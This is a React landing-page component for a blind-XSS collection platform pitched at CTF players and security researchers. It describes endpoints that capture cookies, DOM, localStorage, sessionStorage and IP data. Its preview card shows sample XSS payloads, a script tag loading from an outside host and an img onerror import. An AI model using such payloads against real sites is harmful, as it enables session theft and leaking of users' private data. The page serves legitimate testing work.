import { useState, useEffect, useRef } from "react";
import { Link } from "wouter";
import { motion, useInView, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import {
  ArrowRight, ChevronRight, Shield, Code2, FlaskConical, Terminal,
  Eye, Bell, Copy, Menu, X, Zap, Lock, Database, Globe
} from "lucide-react";

type EasingType = "easeOut";
const EASE: EasingType = "easeOut";
const fadeUp = {
  hidden: { opacity: 0, y: 28 },
  show: (i = 0) => ({ opacity: 1, y: 0, transition: { delay: i * 0.1, duration: 0.6, ease: EASE } }),
};

const stagger = {
  hidden: {},
  show: { transition: { staggerChildren: 0.09 } },
};

// Animated counter hook
function useCounter(target: number, duration = 1500) {
  const [count, setCount] = useState(0);
  const ref = useRef<HTMLDivElement>(null);
  const inView = useInView(ref, { once: true, margin: "-60px" });

  useEffect(() => {
    if (!inView) return;
    let start = 0;
    const step = target / (duration / 16);
    const timer = setInterval(() => {
      start += step;
      if (start >= target) { setCount(target); clearInterval(timer); }
      else setCount(Math.floor(start));
    }, 16);
    return () => clearInterval(timer);
  }, [inView, target, duration]);

  return { count, ref };
}

function GridBg() {
  return (
    <svg className="absolute inset-0 w-full h-full pointer-events-none opacity-[0.032]" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <pattern id="grid" width="44" height="44" patternUnits="userSpaceOnUse">
          <path d="M 44 0 L 0 0 0 44" fill="none" stroke="currentColor" strokeWidth="0.7" />
        </pattern>
      </defs>
      <rect width="100%" height="100%" fill="url(#grid)" />
    </svg>
  );
}

function HeroDecor() {
  return (
    <div className="absolute right-0 top-0 w-[50%] h-full overflow-hidden pointer-events-none">
      <svg className="absolute inset-0 w-full h-full opacity-[0.035]" viewBox="0 0 500 800" preserveAspectRatio="xMidYMid slice">
        {Array.from({ length: 18 }).map((_, i) => (
          <line key={i} x1={-80 + i * 38} y1="0" x2={420 + i * 38} y2="800" stroke="currentColor" strokeWidth="0.9" />
        ))}
      </svg>
      <div className="absolute -right-28 top-1/2 -translate-y-1/2 w-[500px] h-[500px] rounded-full border border-primary/8" />
      <div className="absolute -right-12 top-1/2 -translate-y-1/2 w-[360px] h-[360px] rounded-full border border-primary/6" />
      <div className="absolute right-16 top-1/2 -translate-y-1/2 w-[220px] h-[220px] rounded-full border border-primary/5" />
    </div>
  );
}

const features = [
  {
    icon: Terminal,
    title: "Payload 接收",
    desc: "为每个项目生成唯一端点 URL，自动记录触发时的完整上下文数据",
    tags: ["IP", "UA", "Cookie", "DOM", "Referer"],
    color: "from-primary/10 to-primary/5",
  },
  {
    icon: Eye,
    title: "管理面板",
    desc: "卡片式展示所有命中记录，支持已读/未读标记、排序筛选与删除",
    tags: ["实时通知", "详情查看", "批量操作"],
    color: "from-primary/10 to-primary/5",
  },
  {
    icon: Copy,
    title: "Payload 生成器",
    desc: "根据端点 URL 自动生成 8 种 XSS Payload，覆盖主流注入场景",
    tags: ["script", "img", "svg", "iframe"],
    color: "from-primary/10 to-primary/5",
  },
  {
    icon: Code2,
    title: "XSS 工具包",
    desc: "内置编码转换、Bypass 技巧速查、CSP 分析等实用安全工具",
    tags: ["HTML", "URL", "Base64", "CSP"],
    color: "from-primary/10 to-primary/5",
  },
];

const steps = [
  {
    num: "01",
    title: "创建接收端点",
    desc: "在控制台创建一个带标签的 Token，获得唯一接收 URL",
    icon: Shield,
  },
  {
    num: "02",
    title: "注入 Payload",
    desc: "将生成的 XSS Payload 注入目标页面，等待触发",
    icon: Zap,
  },
  {
    num: "03",
    title: "查看命中数据",
    desc: "收到通知后，在控制台查看完整的触发详情与捕获数据",
    icon: Database,
  },
];

const captureFields = [
  { icon: Globe, label: "页面 URL" },
  { icon: Lock, label: "Cookies" },
  { icon: Database, label: "DOM 内容" },
  { icon: Shield, label: "IP 地址" },
  { icon: Terminal, label: "User-Agent" },
  { icon: Globe, label: "Referer" },
  { icon: Database, label: "localStorage" },
  { icon: Database, label: "sessionStorage" },
];

function StatItem({ value, label, isInfinity = false }: { value: number; label: string; isInfinity?: boolean }) {
  const { count, ref } = useCounter(value);
  return (
    <div ref={ref}>
      <div className="font-serif text-3xl md:text-4xl font-bold text-foreground">
        {isInfinity ? "∞" : `${count}+`}
      </div>
      <div className="text-xs text-muted-foreground mt-1">{label}</div>
    </div>
  );
}

export default function Home() {
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <div className="min-h-screen bg-background text-foreground overflow-x-hidden">
      {/* ── Navbar ───────────────────────────────────────────────── */}
      <nav className="sticky top-0 z-50 bg-background/92 backdrop-blur-md border-b border-border/60">
        <div className="container flex items-center justify-between h-14">
          <Link href="/">
            <span className="font-serif text-lg font-bold tracking-tight cursor-pointer select-none">
              XSS<span className="text-primary">.</span>Platform
            </span>
          </Link>

          {/* Desktop nav */}
          <div className="hidden md:flex items-center gap-1">
            <Link href="/tools">
              <Button variant="ghost" size="sm" className="text-sm text-muted-foreground hover:text-foreground">工具包</Button>
            </Link>
            <Link href="/labs">
              <Button variant="ghost" size="sm" className="text-sm text-muted-foreground hover:text-foreground">XSS Labs</Button>
            </Link>
            <Link href="/dashboard">
              <Button size="sm" className="ml-2 bg-primary text-primary-foreground hover:bg-primary/90 text-sm">
                进入控制台
              </Button>
            </Link>
          </div>

          {/* Mobile hamburger */}
          <button
            className="md:hidden p-2 text-muted-foreground hover:text-foreground transition-colors"
            onClick={() => setMenuOpen(!menuOpen)}
          >
            {menuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
          </button>
        </div>

        {/* Mobile menu */}
        <AnimatePresence>
          {menuOpen && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: "auto", opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="md:hidden overflow-hidden border-t border-border/60 bg-background"
            >
              <div className="container py-3 flex flex-col gap-1">
                <Link href="/tools" onClick={() => setMenuOpen(false)}>
                  <Button variant="ghost" size="sm" className="w-full justify-start text-sm text-muted-foreground">工具包</Button>
                </Link>
                <Link href="/labs" onClick={() => setMenuOpen(false)}>
                  <Button variant="ghost" size="sm" className="w-full justify-start text-sm text-muted-foreground">XSS Labs</Button>
                </Link>
                <Link href="/dashboard" onClick={() => setMenuOpen(false)}>
                  <Button size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-sm mt-1">
                    进入控制台
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </nav>

      {/* ── Hero ─────────────────────────────────────────────────── */}
      <section className="relative min-h-[88vh] flex items-center overflow-hidden">
        <GridBg />
        <HeroDecor />

        <div className="container relative z-10 py-24">
          <div className="max-w-2xl">
            <motion.div initial="hidden" animate="show" variants={stagger}>
              <motion.div variants={fadeUp} custom={0}>
                <div className="inline-flex items-center gap-2 text-xs font-medium text-primary border border-primary/25 rounded-full px-3 py-1 mb-8 bg-primary/5">
                  <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" />
                  面向安全研究人员的专业工具平台
                </div>
              </motion.div>

              <motion.h1
                variants={fadeUp} custom={1}
                className="font-serif text-6xl md:text-7xl lg:text-8xl font-bold leading-[1.05] tracking-tight mb-6"
              >
                Capture<br />
                the <em className="text-primary not-italic">Blind</em><br />
                XSS.
              </motion.h1>

              <motion.p
                variants={fadeUp} custom={2}
                className="text-muted-foreground text-lg leading-relaxed mb-10 max-w-lg"
              >
                专为 CTF 竞赛与安全研究设计的 XSS 盲打接收平台。生成唯一 Payload 端点，
                实时捕获触发数据，一站式管理所有命中记录。
              </motion.p>

              <motion.div variants={fadeUp} custom={3} className="flex flex-wrap gap-3 mb-16">
                <Link href="/dashboard">
                  <Button size="lg" className="bg-primary text-primary-foreground hover:bg-primary/90 gap-2 text-base px-6">
                    进入控制台 <ArrowRight className="w-4 h-4" />
                  </Button>
                </Link>
                <Link href="/tools">
                  <Button size="lg" variant="outline" className="gap-2 text-base px-6">
                    XSS 工具包 <ChevronRight className="w-4 h-4" />
                  </Button>
                </Link>
              </motion.div>

              {/* Stats with counter animation */}
              <motion.div variants={fadeUp} custom={4} className="flex items-center gap-8 pt-8 border-t border-border/60">
                <StatItem value={8} label="Payload 类型" />
                <div className="w-px h-8 bg-border/60" />
                <StatItem value={10} label="捕获字段" />
                <div className="w-px h-8 bg-border/60" />
                <StatItem value={0} label="接收端点" isInfinity />
              </motion.div>
            </motion.div>
          </div>
        </div>

        {/* Code preview card */}
        <motion.div
          initial={{ opacity: 0, x: 50, y: "-50%" }}
          animate={{ opacity: 1, x: 0, y: "-50%" }}
          transition={{ delay: 0.55, duration: 0.75, ease: "easeOut" }}
          className="absolute right-8 top-1/2 hidden xl:block w-[360px]"
          style={{ transform: "translateY(-50%)" }}
        >
          <div className="bg-card border border-border rounded-2xl overflow-hidden shadow-2xl shadow-foreground/8">
            {/* Window chrome */}
            <div className="bg-foreground/[0.04] px-4 py-3 flex items-center gap-2 border-b border-border">
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-foreground/15" />
                <div className="w-3 h-3 rounded-full bg-foreground/15" />
                <div className="w-3 h-3 rounded-full bg-foreground/15" />
              </div>
              <span className="text-xs text-muted-foreground ml-2 font-mono">xss-payload.js</span>
            </div>
            <div className="p-4 font-mono text-xs space-y-3.5 text-foreground/70">
              <div>
                <div className="text-muted-foreground/50 mb-1 text-[11px]">// script src 引入</div>
                <div className="text-primary/80 leading-relaxed">
                  {"<script"} <span className="text-foreground/55">src=</span>
                  <span className="text-foreground/80 break-all">"//xss.hackerchen.com/x/abc123"</span>
                  {"</script>"}
                </div>
              </div>
              <div className="border-t border-border/40 pt-3">
                <div className="text-muted-foreground/50 mb-1 text-[11px]">// img onerror</div>
                <div className="leading-relaxed">
                  <span className="text-primary/80">{"<img"}</span>
                  <span className="text-foreground/55"> src=x onerror=</span>
                  <span className="text-foreground/80 break-all">"import('/x/abc123')"</span>
                  <span className="text-primary/80">{">"}</span>
                </div>
              </div>
              <div className="border-t border-border/40 pt-3">
                <div className="text-muted-foreground/50 mb-1 text-[11px]">// 捕获数据包含：</div>
                <div className="text-foreground/45 text-[11px] leading-6 grid grid-cols-2 gap-x-2">
                  {["pageUrl", "cookies", "dom", "ip", "userAgent", "referer"].map(f => (
                    <span key={f} className="flex items-center gap-1">
                      <span className="w-1 h-1 rounded-full bg-primary/40 shrink-0" />
                      {f}
                    </span>
                  ))}
                </div>
              </div>
            </div>
            <div className="px-4 pb-4">
              <motion.div
                animate={{ opacity: [0.7, 1, 0.7] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="bg-primary/10 border border-primary/20 rounded-lg px-3 py-2 flex items-center gap-2"
              >
                <Bell className="w-3.5 h-3.5 text-primary shrink-0" />
                <span className="text-xs text-primary font-medium">新命中：admin.example.com</span>
              </motion.div>
            </div>
          </div>
        </motion.div>
      </section>

      {/* ── Features ─────────────────────────────────────────────── */}
      <section className="py-24 border-t border-border/60">
        <div className="container">
          <motion.div initial="hidden" whileInView="show" viewport={{ once: true, margin: "-80px" }} variants={stagger}>
            <motion.div variants={fadeUp} className="mb-14">
              <p className="text-xs text-primary font-medium tracking-widest uppercase mb-3">核心功能</p>
              <h2 className="font-serif text-4xl md:text-5xl font-bold leading-tight">
                A complete toolkit,<br />
                <em className="text-primary not-italic">built for hunters.</em>
              </h2>
            </motion.div>

            <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-5">
              {features.map((f, i) => (
                <motion.div
                  key={f.title}
                  variants={fadeUp}
                  custom={i}
                  className="group relative bg-card border border-border rounded-2xl p-6 hover:border-primary/35 hover:shadow-xl hover:shadow-primary/6 transition-all duration-300 cursor-default overflow-hidden"
                >
                  {/* Hover gradient */}
                  <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.03] to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 rounded-2xl" />

                  <div className="relative z-10">
                    <div className="w-11 h-11 rounded-xl bg-primary/10 flex items-center justify-center mb-5 group-hover:bg-primary/18 group-hover:scale-105 transition-all duration-300">
                      <f.icon className="w-5 h-5 text-primary" />
                    </div>
                    <h3 className="font-semibold text-foreground mb-2.5 text-base">{f.title}</h3>
                    <p className="text-sm text-muted-foreground leading-relaxed mb-5">{f.desc}</p>
                    <div className="flex flex-wrap gap-1.5">
                      {f.tags.map((t) => (
                        <span key={t} className="text-[11px] font-mono bg-foreground/5 text-muted-foreground px-2 py-0.5 rounded-full border border-border/80 group-hover:border-primary/20 transition-colors">
                          {t}
                        </span>
                      ))}
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        </div>
      </section>

      {/* ── Capture Fields ───────────────────────────────────────── */}
      <section className="py-20 bg-foreground/[0.015] border-y border-border/50">
        <div className="container">
          <motion.div initial="hidden" whileInView="show" viewport={{ once: true, margin: "-60px" }} variants={stagger}>
            <motion.div variants={fadeUp} className="text-center mb-12">
              <p className="text-xs text-primary font-medium tracking-widest uppercase mb-3">数据捕获</p>
              <h2 className="font-serif text-3xl md:text-4xl font-bold">
                Every detail,{" "}
                <em className="text-primary not-italic">captured.</em>
              </h2>
              <p className="text-muted-foreground mt-3 text-sm max-w-md mx-auto">
                Payload 触发时自动收集以下所有信息，无需额外配置
              </p>
            </motion.div>

            <motion.div variants={fadeUp} className="grid grid-cols-2 sm:grid-cols-4 gap-3 max-w-3xl mx-auto w-full">
              {captureFields.map((field) => (
                <div
                  key={field.label}
                  className="flex items-center gap-2.5 bg-card border border-border rounded-xl px-3 py-3 hover:border-primary/25 hover:bg-primary/[0.02] transition-all duration-200 min-w-0"
                >
                  <div className="w-7 h-7 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
                    <field.icon className="w-3.5 h-3.5 text-primary" />
                  </div>
                  <span className="text-sm font-medium text-foreground/80 truncate">{field.label}</span>
                </div>
              ))}
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* ── How it works ─────────────────────────────────────────── */}
      <section className="py-24">
        <div className="container">
          <motion.div initial="hidden" whileInView="show" viewport={{ once: true, margin: "-80px" }} variants={stagger}>
            <motion.div variants={fadeUp} className="mb-14">
              <p className="text-xs text-primary font-medium tracking-widest uppercase mb-3">工作原理</p>
              <h2 className="font-serif text-4xl md:text-5xl font-bold leading-tight">
                Three steps to<br />
                <em className="text-primary not-italic">capture everything.</em>
              </h2>
            </motion.div>

            <div className="grid md:grid-cols-3 gap-6">
              {steps.map((s, i) => (
                <motion.div key={s.num} variants={fadeUp} custom={i} className="relative group">
                  {i < steps.length - 1 && (
                    <div className="hidden md:block absolute top-10 left-[calc(100%+0px)] w-full h-px bg-gradient-to-r from-border via-border/50 to-transparent z-10 -translate-x-[50%]" />
                  )}
                  <div className="bg-card border border-border rounded-2xl p-7 h-full hover:border-primary/25 hover:shadow-lg hover:shadow-primary/5 transition-all duration-300">
                    <div className="flex items-start justify-between mb-5">
                      <div className="font-serif text-5xl font-bold text-primary/18 leading-none">{s.num}</div>
                      <div className="w-9 h-9 rounded-xl bg-primary/8 flex items-center justify-center group-hover:bg-primary/14 transition-colors">
                        <s.icon className="w-4.5 h-4.5 text-primary/70" />
                      </div>
                    </div>
                    <h3 className="font-semibold text-foreground mb-2.5 text-base">{s.title}</h3>
                    <p className="text-sm text-muted-foreground leading-relaxed">{s.desc}</p>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        </div>
      </section>

      {/* ── XSS Labs CTA ─────────────────────────────────────────── */}
      <section className="py-20 bg-foreground/[0.015] border-t border-border/50">
        <div className="container">
          <motion.div initial="hidden" whileInView="show" viewport={{ once: true, margin: "-80px" }} variants={stagger}>
            <motion.div
              variants={fadeUp}
              className="relative overflow-hidden bg-card border border-border rounded-3xl p-10 md:p-14"
            >
              {/* Decorative circles */}
              <div className="absolute right-0 top-0 w-1/2 h-full overflow-hidden pointer-events-none">
                <div className="absolute -right-20 -top-20 w-72 h-72 rounded-full bg-primary/5" />
                <div className="absolute right-8 bottom-0 w-48 h-48 rounded-full bg-primary/4" />
              </div>
              {/* Decorative grid */}
              <div className="absolute right-0 top-0 w-1/3 h-full overflow-hidden pointer-events-none opacity-40">
                <svg className="absolute inset-0 w-full h-full opacity-[0.06]" xmlns="http://www.w3.org/2000/svg">
                  <defs>
                    <pattern id="grid2" width="32" height="32" patternUnits="userSpaceOnUse">
                      <path d="M 32 0 L 0 0 0 32" fill="none" stroke="currentColor" strokeWidth="0.6" />
                    </pattern>
                  </defs>
                  <rect width="100%" height="100%" fill="url(#grid2)" />
                </svg>
              </div>

              <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between gap-8">
                <div>
                  <div className="inline-flex items-center gap-2 text-xs text-primary font-medium border border-primary/25 rounded-full px-3 py-1 mb-5 bg-primary/5">
                    <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" />
                    即将上线
                  </div>
                  <h2 className="font-serif text-4xl md:text-5xl font-bold mb-3">
                    XSS Labs —{" "}
                    <em className="text-primary not-italic">靶场训练场</em>
                  </h2>
                  <p className="text-muted-foreground max-w-lg leading-relaxed">
                    专为 CTF 选手设计的 XSS 实战靶场，涵盖反射型、存储型、DOM 型等多种场景，
                    配有详细的解题思路与知识点讲解。
                  </p>
                </div>
                <div className="shrink-0">
                  <Link href="/labs">
                    <Button size="lg" variant="outline" className="gap-2 text-base hover:border-primary/40 hover:bg-primary/5">
                      <FlaskConical className="w-5 h-5" />
                      了解更多
                    </Button>
                  </Link>
                </div>
              </div>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* ── Footer ───────────────────────────────────────────────── */}
      <footer className="py-10 border-t border-border/60">
        <div className="container">
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
            <div>
              <span className="font-serif text-base font-bold text-foreground/70">
                XSS<span className="text-primary">.</span>Platform
              </span>
              <p className="text-xs text-muted-foreground mt-1.5">
                专为 CTF 竞赛与安全研究设计的 XSS 盲打接收平台
              </p>
            </div>
            <div className="flex items-center gap-6 text-xs text-muted-foreground">
              <Link href="/tools" className="hover:text-foreground transition-colors hover:text-primary">工具包</Link>
              <Link href="/labs" className="hover:text-foreground transition-colors hover:text-primary">XSS Labs</Link>
              <Link href="/dashboard" className="hover:text-foreground transition-colors hover:text-primary">控制台</Link>
              <Link href="/setup" className="hover:text-foreground transition-colors hover:text-primary">初始化</Link>
            </div>
          </div>
          <div className="mt-6 pt-6 border-t border-border/40 flex flex-col sm:flex-row items-center justify-between gap-3">
            <p className="text-xs text-muted-foreground/60">© 2026 HackerChen · All rights reserved.</p>
            <p className="text-xs text-muted-foreground/50">Crafted with care · Nyx Studio</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
